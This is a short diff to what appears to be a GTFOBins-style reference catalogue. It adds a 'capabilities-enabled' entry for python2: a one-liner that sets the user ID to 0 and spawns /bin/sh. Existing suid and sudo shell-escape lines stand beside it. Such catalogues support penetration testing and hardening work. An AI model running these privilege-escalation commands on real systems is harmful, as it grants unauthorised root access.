@@ -34,4 +34,6 @@ functions:
     - code: ./python2 -c 'import os; os.system("/bin/sh -p")'
   sudo-enabled:
     - code: sudo python2 -c 'import os; os.system("/bin/sh")'
+  capabilities-enabled:
+    - code: ./python2 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ---
